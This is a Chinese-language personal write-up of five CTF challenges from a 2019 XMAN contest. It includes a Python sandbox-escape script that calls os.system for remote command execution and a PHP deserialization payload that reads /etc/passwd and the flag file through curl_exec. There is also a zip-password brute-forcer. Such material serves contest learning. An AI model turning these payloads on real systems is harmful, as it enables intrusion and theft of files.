categories:
- 比赛
tags:
- wp
title: 2019xman个人排位赛wp
---
## escape

收获:了解了python沙箱逃逸这种类型

getattr:对沙箱逃逸有很大作用





list(s)获得字符集,可以用来绕过引号限制

试了一下system

```python
banned=  ["'", '"', '.', 'reload', 'open', 'input', 'file', 'if', 'else', 'eval', 'exit', 'import', 'quit', 'exec', 'code', 'const', 'vars', 'str', 'chr', 'ord', 'local', 'global', 'join', 'format', 'replace', 'translate', 'try', 'except', 'with', 'content', 'frame', 'back']
```

发现引号和点都被过滤了,不过提示说

```python
def hello():
   os.system("echo hello")
```



说明是可以通过调用system来完成,接下来就是想办法得到system函数了

而引号被过滤可以用字符串s里的值来绕过



```python
#考虑这样来
a=getattr(os,'system')
a("命令")
```

```python
def get_str(string):
    result=''
    for i in string:
        result+='table['+str(table.index(i))+']+'
    return result[:-1]
conn=remote('47.97.253.115',10005)
conn.sendline('table=list(s)')
conn.sendline('sys='+get_str('system'))
conn.sendline('fun=getattr(os,sys)')
while 1:
        command=input('(www):$')
        new_com='fun('+get_str(command)+')'
        conn.sendline(new_com)
        print(conn.recvuntil('>>>'))
conn.close()

```



flag{4EEAA88DA0B3207862D2E4876AF84A3D}

## strange_ssid

这题是结束听别人讲的

所有的数据都是32个字符

所以猜测是md5加密

找出符合md5格式的数据

68dffd5a1be838b5326209714f7ea7a5

解密后提交flag{n3k0}失败

直接提交flag{68dffd5a1be838b5326209714f7ea7a5}试试

成功

## **ezphp**



收获:知道了curl_exec 本地文件读取

```php
<?php

class Hello {
    protected $a;

    function test() {
        $b = strpos($this->a, 'flag');
        if($b) {
            die("Bye!");
        }
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $this->a);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 5);
        echo curl_exec($c);
    }
    
    function __destruct(){
        $this->test();
    }
}

if (isset($_GET["z"])) {
    unserialize($_GET["z"]);
} else {
    highlight_file(__FILE__);
}
```



curl_exec+反序列化

试了下本地文件读取

O:5:"Hello":1:{s:1:"a";s:27:"file://localhost/etc/passwd";}

![image1967](http://ww1.sinaimg.cn/large/006pWR9agy1g5uwj7l0c4j30wp0ax407.jpg)

题目过滤flag字符

说明我们flag就在flag文件里

谷歌看了好久，后来看一道又curl_exec的题目，获得了url二次编码的思路

最后的payload:

http://47.97.253.115:10006/?z=O:5:%22Hello%22:1:{s:1:%22a%22;s:23:%22file://localhost/%2566lag%22;}

这里有一些坑就是:

1. 你不知道flag文件在哪个文件夹,结果最后就在根目录。。

2. 因为是二次编码所以要注意字符串的长度



## **onion's_secret**

下载得到一个压缩包，常规的检查走一遍

发现onion.jpg文件尾后还有数据

![image2357](http://ww1.sinaimg.cn/large/006pWR9agy1g5uwp2ulyrj30jj079dif.jpg)

zip格式,get一个新的加密压缩包

密码在hint里有提示

接下来就是很普通的写python了

```python
import zipfile
def burp(filename,hint):
    password=''
    i=0
    for i in range(32,128):
        password=hint.replace('?',chr(i))
        with zipfile.ZipFile(filename) as myzip:
            try :
                print("解密:"+filename+":"+password)
                myzip.read('onion.zip',pwd=bytes(password,encoding='ascii'))
                break
                return password
            except RuntimeError: 
                print("解密失败")
            except FileNotFoundError:
                input('过来康康')
            except zipfile.zlib.error:
                print("跳过")
    if i==127:
        print("爆破失败")
        exit()
    print('爆破成功'+password)
    return password

def writebyte(bbyte,filename):
    f=open(filename,'wb')
    f.write(bbyte)
    f.close()
def readbyte(filename):
    f=open(filename,'rb')
    bbyte=f.read()
    f.close()
    return bbyte

nullbyte=b''
while 1:
    f=open('temp.txt','r')
    hint=f.read()[12:]
    f.close()
    pwd=burp('onion1.zip',hint)
    
    with zipfile.ZipFile('onion1.zip') as myzip:
        str=myzip.read('onion.zip',pwd=bytes(pwd,encoding='ascii'))
        writebyte(str,"temp.zip")
        str=myzip.read('hint.txt',pwd=bytes(pwd,encoding='ascii'))
        writebyte(str,"temp.txt")
    writebyte(readbyte('temp.zip'),'onion1.zip')
    

```

## **commom_encrypt**

读代码就完事了

```python
def encrypt(data,groupnums):
    a=[]
    b=[]
    section=int(len(data)/groupnums)
    for i in range(0,len(data),section):
        a.append(data[i:i+section])
    for i in range(section):
        for j in range(groupnums):
            b.append(a[j][i])
    cipher=(''.join(chr(ord(b[i])^i) for i in range(len(b))))
    return cipher
def decrypt(data):
    result=[]
    for i in range(1,len(data)+1):
        result.append(encrypt(data,i))
    return result

may_r=decrypt('f^n2ekass:iy~>w|`ef"${Ip)8if')
for i in may_r:
    print(i[::2]+i[1::2])
```



